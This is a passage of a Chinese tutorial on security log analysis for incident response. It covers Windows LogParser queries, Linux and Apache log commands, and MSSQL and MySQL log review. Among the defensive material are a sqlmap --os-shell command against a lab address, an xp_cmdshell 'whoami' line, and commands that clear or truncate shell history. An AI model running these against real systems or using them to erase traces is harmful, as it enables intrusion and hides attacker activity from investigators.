class="hljs-string">指定登录时间范围的事件：</span><span class="hljs-string">LogParser.exe -i:EVT –o:DATAGRID  "</span><span class="hljs-keyword">SELECT</span> *  <span class="hljs-keyword">FROM</span> c:\Security.evtx <span class="hljs-keyword">where</span> TimeGenerated&gt;<span class="hljs-string">'2018-06-19 23:32:11'</span> <span class="hljs-keyword">and</span> TimeGenerated&lt;<span class="hljs-string">'2018-06-20 23:34:00'</span> <span class="hljs-keyword">and</span> EventID=<span class="hljs-number">4624</span><span class="hljs-string">"</span><span class="hljs-string"></span><span class="hljs-string">提取登录成功的用户名和IP：</span><span class="hljs-string">LogParser.exe -i:EVT  –o:DATAGRID  "</span><span class="hljs-keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="hljs-number">13</span>,<span class="hljs-string">' '</span>) <span class="hljs-keyword">as</span> EventType,TimeGenerated <span class="hljs-keyword">as</span> LoginTime,EXTRACT_TOKEN(Strings,<span class="hljs-number">5</span>,<span class="hljs-string">'|'</span>) <span class="hljs-keyword">as</span> Username,EXTRACT_TOKEN(Message,<span class="hljs-number">38</span>,<span class="hljs-string">' '</span>) <span class="hljs-keyword">as</span> Loginip <span class="hljs-keyword">FROM</span> c:\Security.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4624</span><span class="hljs-string">"</span></code></pre><p> 2、查询登录失败的事件</p><pre><code class="hljs sql">登录失败的所有事件：LogParser.exe -i:EVT –o:DATAGRID  "<span class="hljs-keyword">SELECT</span> *  <span class="hljs-keyword">FROM</span> c:\Security.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4625</span><span class="hljs-string">"</span><span class="hljs-string"></span><span class="hljs-string">提取登录失败用户名进行聚合统计：</span><span class="hljs-string">LogParser.exe  -i:EVT "</span><span class="hljs-keyword">SELECT</span>  EXTRACT_TOKEN(Message,<span class="hljs-number">13</span>,<span class="hljs-string">' '</span>)  <span class="hljs-keyword">as</span> EventType,EXTRACT_TOKEN(Message,<span class="hljs-number">19</span>,<span class="hljs-string">' '</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">count</span>(EXTRACT_TOKEN(Message,<span class="hljs-number">19</span>,<span class="hljs-string">' '</span>)) <span class="hljs-keyword">as</span> Times,EXTRACT_TOKEN(Message,<span class="hljs-number">39</span>,<span class="hljs-string">' '</span>) <span class="hljs-keyword">as</span> Loginip <span class="hljs-keyword">FROM</span> c:\Security.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4625</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> Message<span class="hljs-string">"</span></code></pre><p>3、系统历史开关机记录：</p><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID  "<span class="hljs-keyword">SELECT</span> TimeGenerated,EventID,Message <span class="hljs-keyword">FROM</span> c:\<span class="hljs-keyword">System</span>.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">6005</span> <span class="hljs-keyword">or</span> EventID=<span class="hljs-number">6006</span><span class="hljs-string">"</span></code></pre><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx" target="_blank" rel="noopener">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="/image/log-1-7.png" srcset="/img/loading.gif" alt=""></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/" target="_blank" rel="noopener">https://event-log-explorer.en.softonic.com/</a></p><p><img src="/image/log-1-8.png" srcset="/img/loading.gif" alt=""></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p><h2 id="第2篇-Linux日志分析"><a href="#第2篇-Linux日志分析" class="headerlink" title="第2篇:Linux日志分析"></a>第2篇:Linux日志分析</h2><h3 id="0x00-前言-2"><a href="#0x00-前言-2" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：<br>    登录失败记录：/var/log/btmp     //lastb<br>    最后一次登录：/var/log/lastlog  //lastlog<br>    登录成功记录: /var/log/wtmp     //last<br>    登录日志记录：/var/log/secure   </p><p>​    目前登录用户信息：/var/run/utmp  //w、who、users</p><p>​    历史命令记录：history<br>​    仅清理当前用户： history -c</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><pre><code class="hljs vim">​标准unix/linux下的<span class="hljs-keyword">grep</span>通过下面參数控制上下文：​<span class="hljs-keyword">grep</span> -C <span class="hljs-number">5</span> foo <span class="hljs-keyword">file</span> 显示<span class="hljs-keyword">file</span>文件里匹配foo字串那行以及上下<span class="hljs-number">5</span>行​<span class="hljs-keyword">grep</span> -B <span class="hljs-number">5</span> foo <span class="hljs-keyword">file</span> 显示foo及前<span class="hljs-number">5</span>行​<span class="hljs-keyword">grep</span> -A <span class="hljs-number">5</span> foo <span class="hljs-keyword">file</span> 显示foo及后<span class="hljs-number">5</span>行​查看<span class="hljs-keyword">grep</span>版本号的方法是​<span class="hljs-keyword">grep</span> -V</code></pre><p>2、grep 查找含有某字符串的所有文件</p><pre><code class="hljs ldif"><span class="hljs-attribute">grep -rn "hello,world!" </span><span class="hljs-attribute">* </span>: 表示当前目录所有文件，也可以是某个文件名<span class="hljs-literal">-r 是递归查找</span><span class="hljs-literal">-n 是显示行号</span><span class="hljs-literal">-R 查找所有文件包含子目录</span><span class="hljs-literal">-i 忽略大小写</span></code></pre><p>3、如何显示一个文件的某几行：</p><pre><code class="hljs angelscript">cat input_file | tail -n +<span class="hljs-number">1000</span> | head -n <span class="hljs-number">2000</span>#从第<span class="hljs-number">1000</span>行开始，显示<span class="hljs-number">2000</span>行。即显示<span class="hljs-number">1000</span>~<span class="hljs-number">2999</span>行</code></pre><p>4、find /etc -name init </p><pre><code>//在目录/etc中查找文件init</code></pre><p>5、只是显示/etc/passwd的账户</p><pre><code>`cat /etc/passwd |awk  -F ':'  '{print $1}'`  //awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。</code></pre><p>6、sed -i ‘153,$d’ .bash_history</p><pre><code>删除历史操作记录，只保留前153行</code></pre><h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p><pre><code class="hljs markdown">1、定位有多少IP在爆破主机的root帐号：    grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more定位有哪些IP在爆破：grep "Failed password" /var/log/secure|grep -E -o "(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)"|uniq -c爆破用户名字典是什么？ grep "Failed password" /var/log/secure|perl -e 'while($_=<span class="xml"><span class="hljs-tag">&lt;&gt;</span></span>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more登录成功的日期、用户名、IP：grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志：Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali<span class="hljs-section">#grep "useradd" /var/log/secure </span>4、删除用户kali日志：Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'<span class="hljs-section"># grep "userdel" /var/log/secure</span>5、su切换用户：Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudo授权执行:sudo -lJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</code></pre><p><strong>2、/var/log/yum.log</strong></p><p>软件安装升级卸载日志：</p><pre><code class="hljs yum">yum install gcc[root@bogon ~]# more /var/log/yum.logJul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</code></pre><h2 id="第3篇-Web日志分析"><a href="#第3篇-Web日志分析" class="headerlink" title="第3篇:Web日志分析"></a>第3篇:Web日志分析</h2><h3 id="ox01-Web日志"><a href="#ox01-Web日志" class="headerlink" title="ox01  Web日志"></a>ox01  Web日志</h3><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] "GET /login.html HTTP/1.1" 200 786 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"</code></p><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h3 id="0x02-日志分析技巧-1"><a href="#0x02-日志分析技巧-1" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><pre><code class="hljs stata">1、列出当天访问次数最多的IP命令：cut -<span class="hljs-keyword">d</span>- -f 1 log_file|uniq -c | <span class="hljs-keyword">sort</span> -rn | head -202、查看当天有多少个IP访问：awk '{<span class="hljs-keyword">print</span> <span class="hljs-variable">$1}</span>' log_file|<span class="hljs-keyword">sort</span>|uniq|wc -<span class="hljs-keyword">l</span>3、查看某一个页面被访问的次数：grep <span class="hljs-string">"/index.php"</span> log_file | wc -<span class="hljs-keyword">l</span>4、查看每一个IP访问了多少个页面：awk '{++S[<span class="hljs-variable">$1</span>]} END {<span class="hljs-keyword">for</span> (a <span class="hljs-keyword">in</span> S) <span class="hljs-keyword">print</span> a,S[a]}' log_file5、将每个IP访问的页面数进行从小到大排序：awk '{++S[<span class="hljs-variable">$1</span>]} END {<span class="hljs-keyword">for</span> (a <span class="hljs-keyword">in</span> S) <span class="hljs-keyword">print</span> S[a],a}' log_file | <span class="hljs-keyword">sort</span> -<span class="hljs-keyword">n</span>6、查看某一个IP访问了哪些页面：grep ^111.111.111.111 log_file| awk '{<span class="hljs-keyword">print</span> <span class="hljs-variable">$1</span>,<span class="hljs-variable">$7}</span>'7、去掉搜索引擎统计当天的页面：awk '{<span class="hljs-keyword">print</span> <span class="hljs-variable">$12</span>,<span class="hljs-variable">$1}</span>' log_file | grep ^\"Mozilla | awk '{<span class="hljs-keyword">print</span> <span class="hljs-variable">$2}</span>' |<span class="hljs-keyword">sort</span> | uniq | wc -<span class="hljs-keyword">l</span>8、查看2018年6月21日14时这一个小时内有多少IP访问:awk '{<span class="hljs-keyword">print</span> <span class="hljs-variable">$4</span>,<span class="hljs-variable">$1}</span>' log_file | grep 21/Jun/2018:14 | awk '{<span class="hljs-keyword">print</span> <span class="hljs-variable">$2}</span>'| <span class="hljs-keyword">sort</span> | uniq | wc -<span class="hljs-keyword">l</span></code></pre><h3 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h3><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="/image/log-3-1.png" srcset="/img/loading.gif" alt=""></p><p>浏览器指纹：</p><p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="/image/log-3-2.png" srcset="/img/loading.gif" alt=""></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><pre><code class="hljs reasonml">A、攻击者访问首页和登录页B、攻击者访问<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MsgSjlb</span>.</span></span>aspx和<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MsgSebd</span>.</span></span>aspxC、攻击者访问<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Xzuser</span>.</span></span>aspxD、攻击者多次POST（怀疑通过这个页面上传模块缺陷）E、攻击者访问了图片木马</code></pre><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h3 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h3><p>统计爬虫：</p><pre><code class="hljs javascript">grep -E <span class="hljs-string">'Googlebot|Baiduspider'</span>  /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log | awk <span class="hljs-string">'{ print $1 }'</span> | sort | uniq</code></pre><p>统计浏览器：</p><pre><code class="hljs javascript">cat /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log | grep -v -E <span class="hljs-string">'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon'</span> | sort | uniq -c | sort -r -n | head -n <span class="hljs-number">100</span></code></pre><p>IP 统计：</p><pre><code class="hljs javascript">grep <span class="hljs-string">'23/May/2019'</span> /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log | awk <span class="hljs-string">'{print $1}'</span> | awk -F<span class="hljs-string">'.'</span> <span class="hljs-string">'{print $1"."$2"."$3"."$4}'</span> | sort | uniq -c | sort -r -n | head -n <span class="hljs-number">10</span>   <span class="hljs-number">2206</span> <span class="hljs-number">219.136</span><span class="hljs-number">.134</span><span class="hljs-number">.13</span>   <span class="hljs-number">1497</span> <span class="hljs-number">182.34</span><span class="hljs-number">.15</span><span class="hljs-number">.248</span>   <span class="hljs-number">1431</span> <span class="hljs-number">211.140</span><span class="hljs-number">.143</span><span class="hljs-number">.100</span>   <span class="hljs-number">1431</span> <span class="hljs-number">119.145</span><span class="hljs-number">.149</span><span class="hljs-number">.106</span>   <span class="hljs-number">1427</span> <span class="hljs-number">61.183</span><span class="hljs-number">.15</span><span class="hljs-number">.179</span>   <span class="hljs-number">1427</span> <span class="hljs-number">218.6</span><span class="hljs-number">.8</span><span class="hljs-number">.189</span>   <span class="hljs-number">1422</span> <span class="hljs-number">124.232</span><span class="hljs-number">.150</span><span class="hljs-number">.171</span>   <span class="hljs-number">1421</span> <span class="hljs-number">106.187</span><span class="hljs-number">.47</span><span class="hljs-number">.224</span>   <span class="hljs-number">1420</span> <span class="hljs-number">61.160</span><span class="hljs-number">.220</span><span class="hljs-number">.252</span>   <span class="hljs-number">1418</span> <span class="hljs-number">114.80</span><span class="hljs-number">.201</span><span class="hljs-number">.18</span></code></pre><p>统计网段：</p><pre><code class="hljs javascript">cat /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log | awk <span class="hljs-string">'{print $1}'</span> | awk -F<span class="hljs-string">'.'</span> <span class="hljs-string">'{print $1"."$2"."$3".0"}'</span> | sort | uniq -c | sort -r -n | head -n <span class="hljs-number">200</span></code></pre><p>统计域名：</p><pre><code class="hljs javascript">cat  /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log |awk <span class="hljs-string">'{print $2}'</span>|sort|uniq -c|sort -rn|more</code></pre><p>HTTP Status：</p><pre><code class="hljs javascript">cat  /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log |awk <span class="hljs-string">'{print $9}'</span>|sort|uniq -c|sort -rn|more<span class="hljs-number">5056585</span> <span class="hljs-number">304</span><span class="hljs-number">1125579</span> <span class="hljs-number">200</span>   <span class="hljs-number">7602</span> <span class="hljs-number">400</span>      <span class="hljs-number">5</span> <span class="hljs-number">301</span></code></pre><p>URL 统计：</p><pre><code class="hljs javascript">cat  /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log |awk <span class="hljs-string">'{print $7}'</span>|sort|uniq -c|sort -rn|more</code></pre><p>文件流量统计：</p><pre><code class="hljs javascript">cat /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log |awk <span class="hljs-string">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span>|sort -rn|moregrep <span class="hljs-string">' 200 '</span> /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log |awk <span class="hljs-string">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span>|sort -rn|more</code></pre><p>URL访问量统计：</p><pre><code class="hljs javascript">cat /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log | awk <span class="hljs-string">'{print $7}'</span> | egrep <span class="hljs-string">'\?|&amp;'</span> | sort | uniq -c | sort -rn | more</code></pre><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><pre><code class="hljs javascript">grep -v <span class="hljs-number">0</span>$ /www/logs/access<span class="hljs-number">.2019</span><span class="hljs-number">-02</span><span class="hljs-number">-23.</span>log | awk -F <span class="hljs-string">'\" '</span> <span class="hljs-string">'{print $4" " $1}'</span> web.log | awk <span class="hljs-string">'{print $1" "$8}'</span> | sort -n -k <span class="hljs-number">1</span> -r | uniq &gt; <span class="hljs-regexp">/tmp/</span>slow_url.txt</code></pre><p>IP, URL 抽取：</p><pre><code class="hljs javascript"># tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1" "$7}'</code></pre><p> 参考链接：</p><blockquote><p><a href="https://www.jb51.net/article/53954.htm" target="_blank" rel="noopener">https://www.jb51.net/article/53954.htm</a></p><p><a href="https://www.jb51.net/article/58017.htm" target="_blank" rel="noopener">https://www.jb51.net/article/58017.htm</a></p><p><a href="https://cloud.tencent.com/developer/article/1051427" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1051427</a></p></blockquote><h2 id="第4篇-MSSQL日志分析"><a href="#第4篇-MSSQL日志分析" class="headerlink" title="第4篇:MSSQL日志分析"></a>第4篇:MSSQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-MSSQL日志分析"><a href="#0x01-MSSQL日志分析" class="headerlink" title="0x01 MSSQL日志分析"></a>0x01 MSSQL日志分析</h3><p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。</p><p><img src="/image/log-4-3.png" srcset="/img/loading.gif" alt=""></p><p>登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志</p><p><img src="/image/log-4-4.png" srcset="/img/loading.gif" alt=""></p><p>双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。</p><p><img src="/image/log-4-5.png" srcset="/img/loading.gif" alt=""></p><p>另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。</p><p><img src="/image/log-4-6.png" srcset="/img/loading.gif" alt=""></p><p>日志分析案例：</p><p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。</p><p><img src="/image/log-4-7.png" srcset="/img/loading.gif" alt=""></p><p>筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p><p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。</p><p><img src="/image/log-4-8.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-SQL注入入侵痕迹"><a href="#0x02-SQL注入入侵痕迹" class="headerlink" title="0x02  SQL注入入侵痕迹"></a>0x02  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-1.png" srcset="/img/loading.gif" alt=""></p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、数据库表检查</p><p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-2.png" srcset="/img/loading.gif" alt=""></p><p>2、检查xp_cmdshell等存储过程</p><p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p><p>`Exec master.dbo.xp_cmdshell ‘whoami’</p><p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p><h2 id="第5篇-MySQL日志分析"><a href="#第5篇-MySQL日志分析" class="headerlink" title="第5篇:MySQL日志分析"></a>第5篇:MySQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-Mysql日志分析"><a href="#0x01-Mysql日志分析" class="headerlink" title="0x01 Mysql日志分析"></a>0x01 Mysql日志分析</h3><p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p><pre><code class="hljs gams"><span class="hljs-number">1</span>、查看<span class="hljs-built-in">log</span>配置信息show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">'%general%'</span>;<span class="hljs-number">2</span>、开启日志<span class="hljs-keyword">SET</span> GLOBAL <span class="hljs-comment">general_log =</span> <span class="hljs-comment">'On'</span>;<span class="hljs-number">3</span>、指定日志文件路径#<span class="hljs-keyword">SET</span> GLOBAL <span class="hljs-comment">general_log_file =</span> <span class="hljs-comment">'/var/lib/mysql/mysql.log'</span>;</code></pre><p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p><pre><code class="hljs angelscript"><span class="hljs-number">190604</span> <span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">14</span>       <span class="hljs-number">14</span> Connect    <span class="hljs-symbol">root@</span>localhost on            <span class="hljs-number">14</span> Init DB    test           <span class="hljs-number">14</span> Query    SELECT * FROM admin WHERE id = <span class="hljs-number">1</span>           <span class="hljs-number">14</span> Quit  `</code></pre><p>我们按列来解析一下：</p><pre><code class="hljs sql">第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。第二列:Id，就是<span class="hljs-keyword">show</span> <span class="hljs-keyword">processlist</span>出来的第一列的线程<span class="hljs-keyword">ID</span>,对于长连接和一些比较耗时的<span class="hljs-keyword">sql</span>语句,你可以精确找出究竟是那一条那一个线程在运行。第三列:Command，操作类型，比如<span class="hljs-keyword">Connect</span>就是连接数据库，<span class="hljs-keyword">Query</span>就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。第四列:Argument，详细信息，例如 <span class="hljs-keyword">Connect</span>    root@localhost <span class="hljs-keyword">on</span> 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</code></pre><h3 id="0x02-登录成功-失败"><a href="#0x02-登录成功-失败" class="headerlink" title="0x02 登录成功/失败"></a>0x02 